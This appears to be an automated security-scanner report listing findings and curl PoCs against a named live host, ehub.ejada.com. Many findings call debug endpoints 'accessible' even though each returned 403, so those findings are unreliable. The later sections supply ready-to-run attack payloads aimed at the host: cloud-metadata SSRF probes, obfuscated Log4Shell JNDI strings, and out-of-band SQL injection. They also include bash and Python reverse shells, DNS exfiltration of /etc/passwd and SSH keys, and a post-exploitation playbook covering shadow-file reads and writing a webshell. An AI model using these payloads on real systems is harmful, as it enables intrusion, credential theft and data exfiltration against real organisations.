#### [MEDIUM] DEBUG-EP-_DEBUG_VARS: Debug/profiler endpoint accessible: /debug/vars
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/debug/vars returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/debug/vars
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_DEBUG_REQUESTS: Debug/profiler endpoint accessible: /debug/requests
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/debug/requests returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/debug/requests
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-___DEBUG___: Debug/profiler endpoint accessible: /__debug__/
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/__debug__/ returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/__debug__/
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__DEBUG_: Debug/profiler endpoint accessible: /_debug/
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_debug/ returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_debug/
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__PROFILE: Debug/profiler endpoint accessible: /_profile
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_profile returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_profile
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_METRICS: Debug/profiler endpoint accessible: /metrics
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/metrics returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/metrics
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_METRICS_PROMETHEUS: Debug/profiler endpoint accessible: /metrics/prometheus
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/metrics/prometheus returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/metrics/prometheus
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_JOLOKIA: Debug/profiler endpoint accessible: /jolokia
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/jolokia returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/jolokia
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_JOLOKIA_READ: Debug/profiler endpoint accessible: /jolokia/read
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/jolokia/read returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/jolokia/read
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__AH_ADMIN: Debug/profiler endpoint accessible: /_ah/admin
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_ah/admin returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_ah/admin
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__AH_MAIL: Debug/profiler endpoint accessible: /_ah/mail
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_ah/mail returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_ah/mail
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__AH_WARMUP: Debug/profiler endpoint accessible: /_ah/warmup
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_ah/warmup returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_ah/warmup
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_DRUID_INDEX.HTML: Debug/profiler endpoint accessible: /druid/index.html
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/druid/index.html returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/druid/index.html
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_KIBANA: Debug/profiler endpoint accessible: /kibana
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/kibana returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/kibana
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_SOLR_ADMIN: Debug/profiler endpoint accessible: /solr/admin
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/solr/admin returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/solr/admin
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_SOLR_ADMIN_INFO_SYS: Debug/profiler endpoint accessible: /solr/admin/info/system
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/solr/admin/info/system returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/solr/admin/info/system
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-___ADMIN__: Debug/profiler endpoint accessible: /__admin__
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/__admin__ returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/__admin__
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-___STATUS__: Debug/profiler endpoint accessible: /__status__
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/__status__ returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/__status__
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-___HEALTH__: Debug/profiler endpoint accessible: /__health__
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/__health__ returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/__health__
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_TELESCOPE: Debug/profiler endpoint accessible: /telescope
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/telescope returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/telescope
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_TELESCOPE_REQUESTS: Debug/profiler endpoint accessible: /telescope/requests
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/telescope/requests returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/telescope/requests
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_HORIZON: Debug/profiler endpoint accessible: /horizon
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/horizon returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/horizon
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_HORIZON_API_STATS: Debug/profiler endpoint accessible: /horizon/api/stats
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/horizon/api/stats returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/horizon/api/stats
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-__PROFILER_PHPSTORM: Debug/profiler endpoint accessible: /_profiler/phpstorm
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/_profiler/phpstorm returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/_profiler/phpstorm
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] DEBUG-EP-_?XDEBUG_SESSION_STA: Debug/profiler endpoint accessible: /?XDEBUG_SESSION_START=1
**CWE:** CWE-489 | **CVSS:** 4.3 | **Category:** Information Disclosure

https://ehub.ejada.com/?XDEBUG_SESSION_START=1 returned 403. Content: Host not in allowlist

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/?XDEBUG_SESSION_START=1
```

**Fix:** Disable debug endpoints in production. Restrict with network ACL or remove entirely.

---

#### [MEDIUM] GQL-CIRCULAR-CIRCULAR: GraphQL circular payload accepted (0.0s) — DoS surface
**CWE:** CWE-674 | **CVSS:** 5.9 | **Category:** GraphQL

GraphQL endpoint /graphql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk -X POST https://ehub.ejada.com/graphql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
```

**Fix:** Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.

---

#### [MEDIUM] GQL-CIRCULAR-CIRCULAR: GraphQL circular payload accepted (0.0s) — DoS surface
**CWE:** CWE-674 | **CVSS:** 5.9 | **Category:** GraphQL

GraphQL endpoint /api/graphql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk -X POST https://ehub.ejada.com/api/graphql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
```

**Fix:** Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.

---

#### [MEDIUM] GQL-CIRCULAR-CIRCULAR: GraphQL circular payload accepted (0.0s) — DoS surface
**CWE:** CWE-674 | **CVSS:** 5.9 | **Category:** GraphQL

GraphQL endpoint /gql processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk -X POST https://ehub.ejada.com/gql -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
```

**Fix:** Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.

---

#### [MEDIUM] GQL-CIRCULAR-CIRCULAR: GraphQL circular payload accepted (0.0s) — DoS surface
**CWE:** CWE-674 | **CVSS:** 5.9 | **Category:** GraphQL

GraphQL endpoint /query processed circular payload in 0.0s without depth/complexity rejection. Circular fragments can cause infinite recursion; 100-alias queries amplify resolver cost.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk -X POST https://ehub.ejada.com/query -H 'Content-Type: application/json' -d '{"query": "fragment A on __Schema { types { ...B } } fragment B on __Type { fields { ...A } } { ...A }"}...'
```

**Fix:** Implement query depth limit (≤10), complexity budget, and fragment cycle detection. Disable or rate-limit introspection.

---

#### [MEDIUM] DNS-REBIND-SURFACE: DNS rebinding attack surface assessment for ehub.ejada.com
**CWE:** CWE-346 | **CVSS:** 5.4 | **Category:** DNS

Host ehub.ejada.com resolves to 34.111.193.103 (public).
CORS Origin: null → ACAO: ''
DNS rebinding: attacker DNS record oscillates between attacker IP and target IP. Browser then allows cross-origin requests to the re-bound address. Services trusting Host header or lacking CSRF protection are vulnerable.

**Evidence:**
```

```

**PoC:**
```bash
# DNS rebinding PoC (use singularity or rebind.network):
# 1. Register attacker domain with short TTL → your IP
# 2. Victim browser loads attacker page
# 3. DNS flips to 34.111.193.103
# 4. XHR to http://attacker-domain/ now hits ehub.ejada.com
curl -sk https://ehub.ejada.com/ -H 'Host: attacker-rebind.example.com'
```

**Fix:** Validate Host header against a strict allowlist. Set DNS TTL ≥ 300s. Bind services to specific IPs, not 0.0.0.0. Require CSRF tokens.

---

#### [MEDIUM] CF-ORIGIN-BYPASS-001: Cloudflare/CDN Origin Bypass Attack Surface
**CWE:** CWE-441 | **CVSS:** 5.3 | **Category:** CDN Bypass

Multiple indicators for Cloudflare/CDN origin IP bypass at ehub.ejada.com. Direct-to-origin connection bypasses WAF rules, rate limiting, and DDoS protection.

**Evidence:**
```
Current resolved IP: 34.111.193.103 — test direct connection bypassing WAF/CDN
Subdomains discovered: www.ejada.com, mail.ejada.com, smtp.ejada.com — test each for direct-to-origin access bypassing CDN
```

**PoC:**
```bash
# Test direct connection with Host header:
curl -sk --resolve 'ehub.ejada.com:34.111.193.103' 'https://ehub.ejada.com/' -H 'Host: ehub.ejada.com'
# Check cdn-cgi/trace for origin info:
curl -sk 'https://ehub.ejada.com/cdn-cgi/trace'
```

**Fix:** Configure Cloudflare to block non-Cloudflare IPs (Cloudflare IP ranges only). Enable authenticated origin pulls. Use Argo Tunnel / Cloudflare Access.

---

#### [INFO] F-BSSRF-001: Blind SSRF Attack Surface — OOB Payloads Generated
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

Generated 10 OOB SSRF payloads for manual verification.

**Evidence:**
```
proxy: https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DOMAIN.burpc
endpoint: https://ehub.ejada.com?endpoint=http%3A//endpoint.ehub.ejada.com.YOUR_OOB_DOMAIN
target: https://ehub.ejada.com?target=http%3A//target.ehub.ejada.com.YOUR_OOB_DOMAIN.bur
href: https://ehub.ejada.com?href=http%3A//href.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcol
fetch: https://ehub.ejada.com?fetch=http%3A//fetch.ehub.ejada.com.YOUR_OOB_DOMAIN.burpc
feed: https://ehub.ejada.com?feed=http%3A//feed.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcol
link: https://ehub.ejada.com?link=http%3A//link.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcol
webhook: https://ehub.ejada.com?webhook=http%3A//webhook.ehub.ejada.com.YOUR_OOB_DOMAIN.b
resource: https://ehub.ejada.com?resource=http%3A//resource.ehub.ejada.com.YOUR_OOB_DOMAIN
redirect: https://ehub.ejada.com?redirect=http%3A//redirect.ehub.ejada.com.YOUR_OOB_DOMAIN
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com?proxy=http%3A//proxy.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/'
```

**Fix:** Use Burp Collaborator or https://app.interactsh.com to detect DNS callbacks.

---

#### [INFO] F-VDP-001: No security.txt / Vulnerability Disclosure Policy
**CWE:** CWE-200 | **CVSS:** 0.0 | **Category:** VDP

No security.txt file found. Researchers have no official contact for vulnerability reports.

**Evidence:**
```
Checked: ['/.well-known/security.txt', '/security.txt', '/.well-known/change-password', '/bugbounty', '/responsible-disclosure', '/vulnerability-disclosure']
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/.well-known/security.txt'
```

**Fix:** Create /.well-known/security.txt per RFC 9116 with Contact: and Policy: fields.

---

#### [INFO] SSRF-META-PROBE: Cloud metadata SSRF payloads generated (manual verification required)
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

SSRF parameters probed for cloud metadata leakage. No confirmed hit in automated scan — manual verification needed with burp collaborator.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/'
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl -sk 'https://ehub.ejada.com/?url=http://metadata.google.internal/computeMetadata/v1/'
curl -sk 'https://ehub.ejada.com/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'
curl -sk 'https://ehub.ejada.com/?url=http://100.100.100.200/latest/meta-data/'
curl -sk 'https://ehub.ejada.com/?url=http://fd00:ec2::254/latest/meta-data/'
```

**Fix:** Implement SSRF allowlist. Block RFC1918 + 169.254.0.0/16 ranges in outbound requests.

---

#### [INFO] SSL-PIN-HINTS: SSL certificate fingerprints (for pinning bypass research)
**CWE:** CWE-295 | **CVSS:** 0.0 | **Category:** TLS

CN=? | Issuer=? | Expires=?
SHA-256: 579f1b9818e49c34198b6a01421651818b8e1af455cffb313ad77280b961bb7a
SHA-1: e5dc13f4e8bbd319fd0e68c9bb66acd061ca5833

**Evidence:**
```

```

**PoC:**
```bash
# Add to Frida/objection pinning bypass:
# openssl s_client -connect ehub.ejada.com:443 </dev/null 2>/dev/null | openssl x509 -fingerprint -sha256
```

**Fix:** Implement certificate pinning with backup pins. Rotate pins with 60-day lead time.

---

#### [INFO] LOG4SHELL-OOB-POC: Log4Shell OOB PoC generated — requires Burp Collaborator / interactsh
**CWE:** CWE-917 | **CVSS:** 0.0 | **Category:** RCE

JNDI payloads were sent in 5 common headers. No server-side reflection detected passively. Use Burp Collaborator to observe DNS/HTTP callbacks.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk https://ehub.ejada.com/ -H 'User-Agent: ${jndi:ldap://COLLAB/0}'
curl -sk https://ehub.ejada.com/ -H 'X-Forwarded-For: ${jndi:ldap://COLLAB/1}'
curl -sk https://ehub.ejada.com/ -H 'X-Api-Version: ${jndi:ldap://COLLAB/2}'
curl -sk https://ehub.ejada.com/ -H 'X-Remote-IP: ${jndi:ldap://COLLAB/3}'
curl -sk https://ehub.ejada.com/ -H 'X-Remote-Addr: ${jndi:ldap://COLLAB/4}'
```

**Fix:** Upgrade Log4j to ≥2.17.1. Remove log4j from all JVM-based services. Block outbound LDAP/RMI.

---

#### [INFO] SSRF-BYPASS-POC: SSRF URL parser bypass payloads generated — manual verification required
**CWE:** CWE-918 | **CVSS:** 0.0 | **Category:** SSRF

11 SSRF blocklist bypass variants generated for manual testing with Burp Collaborator.

**Evidence:**
```

```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com//?url=http://evil.com@169.254.169.254/latest/meta-data/'
curl -sk 'https://ehub.ejada.com//?url=http://169.254.169.254#@evil.com/'
curl -sk 'https://ehub.ejada.com//?url=http://169.254.169.254%252F%252F'
curl -sk 'https://ehub.ejada.com//?url=http://0x7f000001/'
curl -sk 'https://ehub.ejada.com//?url=http://2130706433/'
```

**Fix:** Allowlist by resolved IP, not URL string. Parse URL server-side with a strict library before any fetch.

---

#### [INFO] SQLI-OOB-DNS: OOB SQL injection DNS payloads generated (MySQL/MSSQL/Oracle/PostgreSQL)
**CWE:** CWE-89 | **CVSS:** 0.0 | **Category:** Injection

DNS-based out-of-band SQLi payloads generated for all four major databases. Replace YOUR_COLLABORATOR with Burp Collaborator or interactsh host. DNS callbacks confirm blind SQLi when error/boolean methods are blocked.

**Evidence:**
```

```

**PoC:**
```bash
# MySQL:
curl -sk 'https://ehub.ejada.com/api?id=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MySQL:
curl -sk 'https://ehub.ejada.com/api?user=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MySQL:
curl -sk 'https://ehub.ejada.com/api?username=' AND LOAD_FILE(CONCAT('\\\\',version(),'.YOUR_COLLABORATOR\\a'))-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?id='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?user='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
# MSSQL:
curl -sk 'https://ehub.ejada.com/api?username='; EXEC master..xp_dirtree '\\YOUR_COLLABORATOR\a'-- -'
```

**Fix:** Use parameterised queries. Restrict DB user privileges to prevent file/network operations. Block outbound DNS from DB servers.

---

#### [INFO] RCE-VRF-001: RCE Verification — OOB DNS Callback Payloads Generated
**CWE:** CWE-78 | **CVSS:** 0.0 | **Category:** RCE

Generated 6 OOB DNS-callback RCE verification payloads for ehub.ejada.com. Replace YOUR_OOB_DOMAIN with your Burp Collaborator / interactsh domain and inject into any confirmed command injection, SSTI, or deserialization point to verify OOB execution.

**Evidence:**
```
  [bash] bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_OOB_DOMAIN.burpcollaborator.net/443+0>%261'
  [curl] curl+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(id)
  [wget] wget+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(whoami)
  [python] python3+-c+'import+socket,subprocess,os;s=socket.socket();s.connect(("YOUR_OOB_DOMAIN.burpcollaborator.net",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  [nslookup] nslookup+$(id).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
  [ping] ping+-c+1+$(uname+-a|base64|tr+-d+\'\n\').YOUR_OOB_DOMAIN.burpcollaborator.net
```

**PoC:**
```bash
# Inject into confirmed injection point:
curl -sk 'https://ehub.ejada.com/api/cmd?cmd=curl+http://rce.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/$(id)'
```

**Fix:** Use interactsh (https://app.interactsh.com) or Burp Collaborator to detect DNS callbacks. Each shell variant targets a different interpreter; monitor all.

---

#### [INFO] POST-EXPLOIT-MAP-001: Post-Exploitation Path Map — Authorized Testing Playbook
**CWE:** CWE-693 | **CVSS:** 0.0 | **Category:** Post-Exploitation Analysis

Post-exploitation paths identified based on confirmed findings. For authorized penetration testing only — document evidence, stop at proof-of-concept, report to client/program.

**Evidence:**
```

[RCE Post-Exploitation]
  → cat /etc/passwd && cat /etc/shadow (privilege check)
  → find / -perm -4000 -type f 2>/dev/null (SUID binaries)
  → sudo -l (sudo permissions)
  → cat ~/.ssh/id_rsa (SSH private keys)
  → env | grep -i 'secret\|key\|pass\|token' (env secrets)
  → cat /proc/net/fib_trie (internal network ranges)
  → arp -a && ip route (network topology)
  → ps aux && netstat -tlnp (running services)
  → find / -name '*.conf' -o -name '*.cfg' 2>/dev/null | head -20
  → curl http://169.254.169.254/latest/meta-data/ 2>/dev/null (cloud IMDS)
  → cat /var/www/html/.env 2>/dev/null (application secrets)
  → mysql -u root -p'' -e 'show databases;' 2>/dev/null (DB access)

[SQLi Post-Exploitation]
  → Extract schema: SELECT table_name FROM information_schema.tables
  → Dump users table: SELECT username,password FROM users LIMIT 10
  → Read files: SELECT LOAD_FILE('/etc/passwd') (MySQL)
  → Write webshell: SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/cmd.php'
  → OOB exfil: SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\x')) (MSSQL)
  → Extract credentials from app config tables

[SSRF Post-Exploitation]
  → Probe internal network: http://10.0.0.1/, http://192.168.1.1/
  → AWS IMDS: http://169.254.169.254/latest/meta-data/iam/security-credentials/
  → GCP IMDS: http://metadata.google.internal/computeMetadata/v1/
  → Azure IMDS: http://169.254.169.254/metadata/instance?api-version=2021-02-01
  → Internal services: http://localhost:8080/, :8443, :6379, :27017
  → K8s API: http://10.96.0.1:443/api/v1/secrets

[LFI Post-Exploitation]
  → /etc/passwd, /etc/shadow, /etc/hosts, /etc/crontab
  → /proc/self/environ (env variables including secrets)
  → /var/log/apache2/access.log (log poisoning → RCE)
  → /var/log/nginx/access.log (nginx log poison)
  → /home/*/.ssh/id_rsa, /root/.ssh/id_rsa
  → /var/www/html/.env, config.php, wp-config.php
  → php://filter/convert.base64-encode/resource=config (PHP source)

[JWT Bypass Post-Exploitation]
  → Forge admin token with alg=none
  → Predict HMAC secret via cracking: hashcat -a 0 -m 16500 token.jwt wordlist.txt
  → Forge token for all user roles and enumerate admin endpoints
  → Enumerate /api/admin, /api/v*/admin/* with forged token
  → Extract other user data via IDOR with crafted sub/user_id claims
```

**PoC:**
```bash
# Execute only within authorized scope with written permission
```

**Fix:** Each post-exploitation path represents a concrete attack vector. Address findings in order of CVSS score. Implement network segmentation, EDR, and SIEM to detect post-exploitation activity.

---

#### [INFO] LOG4SHELL2-OOB-PAYLOADS: Log4Shell Follow-On — All OOB Probe Payloads Generated
**CWE:** CWE-917 | **CVSS:** 0.0 | **Category:** Log4Shell / Java RCE

Generated 10 Log4Shell bypass payloads for 15 injection headers. Replace YOUR_OOB_DOMAIN with interactsh/Collaborator domain. Monitor for DNS callbacks confirming JNDI lookup execution.

**Evidence:**
```
  [1] ${jndi:ldap://basic.__HOST__.__OOB__/a}
  [2] ${${lower:j}ndi:${lower:l}dap://cve45046.__HOST__.__OOB__/a}
  [3] ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://obfs.__HOST__.__OO
  [4] ${${upper:j}ndi:${upper:l}dap://upper.__HOST__.__OOB__/a}
  [5] ${jndi:rmi://rmi.__HOST__.__OOB__/a}
  [6] ${jndi:iiop://iiop.__HOST__.__OOB__/a}
  [7] ${jndi:dns://dns.__HOST__.__OOB__/a}
  [8] ${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//nested.__HOST__.__
  [9] ${env:HOSTNAME}
  [10] ${spring:application.name}
```

**PoC:**
```bash
curl -sk 'https://ehub.ejada.com/' -H 'X-Api-Version: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'X-Forwarded-For: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'User-Agent: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
curl -sk 'https://ehub.ejada.com/' -H 'Referer: ${jndi:ldap://basic.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net/a}'
```

**Fix:** See CVE-2021-44228 mitigations. Monitor all injection points with interactsh. Use JNDI allow-list to block outbound LDAP/RMI/IIOP.

---

#### [INFO] DNS-EXFIL-CAPACITY-001: DNS Exfiltration — Channel Analysis & Payload Library
**CWE:** CWE-200 | **CVSS:** 0.0 | **Category:** DNS Exfiltration

DNS exfiltration channel capacity: ~189 chars/query via 3-label subdomain. Generated 6 OOB DNS exfil payloads. Use interactsh with DNS listener to capture exfiltrated data.

**Evidence:**
```
  [1] $($(cat /etc/passwd | base64 | tr -d '\n' | cut -c1-50)).exfil.ehub.ejada.com.YO
  [2] $($(id | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
  [3] $($(hostname | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.ne
  [4] $($(whoami | base64)).exfil.ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net
  [5] $($(env | grep -i pass | base64 | head -c 50)).exfil.ehub.ejada.com.YOUR_OOB_DOM
  [6] $($(cat ~/.ssh/id_rsa | base64 | cut -c1-50)).exfil.ehub.ejada.com.YOUR_OOB_DOMA
```

**PoC:**
```bash
# DNS exfil via curl:
curl -sk 'https://ehub.ejada.com/?host=$(id|base64).ehub.ejada.com.YOUR_OOB_DOMAIN.burpcollaborator.net'
# Listen with interactsh:
interactsh-client -server interactsh.com -n 1
```

**Fix:** Monitor DNS queries for anomalous subdomain patterns. Implement Response Policy Zones (RPZ). Apply DNS-over-HTTPS with filtering. Block outbound UDP 53 from application servers.

---

#### [INFO] LOG4SHELL2-OOB-PAYLOADS: Log4Shell Follow-On — All OOB Probe Payloads Generated
**CWE:** CWE-917 | **CVSS:** 0.0 | **Category:** Log4Shell / Java RCE

